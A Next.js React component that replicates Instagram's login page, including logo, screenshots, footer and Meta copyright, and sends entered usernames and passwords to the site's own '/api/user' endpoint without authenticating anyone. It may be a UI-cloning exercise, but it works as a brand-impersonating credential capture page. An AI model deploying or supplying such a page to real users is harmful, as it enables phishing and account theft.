'use client';
import React, { useState } from 'react';

import Link from 'next/link';

const InstagramLogin = () => {
  const [username, setUsername] = useState('');
  const [password, setPassword] = useState('');
  const handleSubmit = async (e) => {
    e.preventDefault();

    const res = await fetch('/api/user', {
      method: 'POST',
      headers: {
        'Content-Type': 'application/json'
      },
      body: JSON.stringify({ username, password })
    });
    const data = await res.json();
  }
  return (
    <div className="h-screen flex items-center justify-center">
      <div className="mx-auto max-w-[935px] my-auto text-[#868585] pb-5 px-4">
        <section className="flex justify-center">
          {/* SMARTPHONE SECTION */}
          <article className="hidden md:block -ml-[90px] relative">
            <div className="absolute top-[25px] left-[160px] animate-fade">
              <img className="absolute fade w-[250px]" src="img/screen1.png" alt="screen1" />
              <img className="absolute fade w-[250px]" src="img/screen2.png" alt="screen2" />
              <img className="absolute fade w-[250px]" src="img/screen3.png" alt="screen3" />
            </div>
            <img src="img/smartphones.png" alt="smartphones" />
          </article>

          {/* FORM SECTION */}
          <article className="flex flex-col h-full pt-4">
            <div className="w-[355px] px-[30px] pt-[40px] pb-0 bg-white border border-[#dbdbdb] border-b-0">
              <img src="img/logo.png" alt="Instagram Logo" className="w-[170px] mx-auto" />
            </div>

            <form onSubmit={handleSubmit} className="flex flex-col items-center w-[355px] py-5 bg-white border border-[#dbdbdb] border-t-0">
              <input
                type="text"
                name="username"
                id="username"
                value={username}
                onChange={(e) => setUsername(e.target.value)}
                placeholder="Phone, username or email"
                className="w-[280px] p-[13px_4px] mb-1.5 text-xs border border-[#dbdbdb] rounded bg-[#fafafa]"
              />
              <input
                type="password"
                name="password"
                id="password"
                placeholder="Password"
                value={password}
                onChange={(e) => setPassword(e.target.value)}
                className="w-[280px] p-[13px_4px] mb-1.5 text-xs border border-[#dbdbdb] rounded bg-[#fafafa]"
              />
              <button type='submit'  className="w-[280px] mt-2 px-2.5 py-1.5 bg-[#8cd6ec] text-white font-medium rounded hover:bg-[#63c7e6] cursor-pointer">
                Log In
              </button>
              <div className="flex items-center my-4 text-sm font-bold text-[#868585]">
                <div className="w-[110px] h-px bg-[#dbdbdb] mx-4" />
                <p>OR</p>
                <div className="w-[110px] h-px bg-[#dbdbdb] mx-4" />
              </div>

              <div className="text-center">
                <Link href="#" className="text-[#385185] text-base font-bold hover:text-[#3f37ad]">
                  <span className="inline-block mr-1"><i className="fab fa-facebook-square" /></span>
                  Log in with Facebook
                </Link>
                <div className="mt-6">
                  <Link href="#" className="text-sm text-[#868585]">Forgot password?</Link>
                </div>
              </div>
            </form>

            <div className="w-[355px] mt-2 py-[22px] text-center text-sm bg-white border border-[#dbdbdb]">
              <Link href="#" className="text-[#868585]">Don&apos;t have an account? <span className="text-[#63c7e6] font-bold">Sign up</span></Link>
            </div>

            <div className="w-[355px] mt-2 text-center text-[#868585]">
              <p>Get the app</p>
              <div className="mt-4 flex justify-center gap-2">
                <Link href="#"><img src="img/appstore.png" width={140} alt="Download on App Store" className="w-[140px]" /></Link>
                <Link href="#"><img src="img/googleplay.png" width={140} alt="Download on Google Play" className="w-[140px]" /></Link>
              </div>
            </div>
          </article>
        </section>

        {/* FOOTER */}
        <footer className="text-center text-sm mt-5">
          <div className="mb-1">
            {[
              "Meta", "About", "Blog", "Careers", "API", "Privacy", "Terms", "Top Accounts",
              "Hashtags", "Locations", "Instagram Lite", "Contact Upload & Non-Users"
            ].map(link => (
              <Link href="#" key={link} className="mx-1 text-[#868585]">{link}</Link>
            ))}
          </div>
          <div className="mb-4">
            {["Dance", "Food & Drink", "Home & Garden", "Music", "Visual Arts"].map(link => (
              <Link href="#" key={link} className="mx-1 text-[#868585]">{link}</Link>
            ))}
          </div>
          <div className="text-[#868585]">&copy; 2022 Instagram from Meta</div>
        </footer>
      </div>
    </div>
  );
};

export default InstagramLogin;
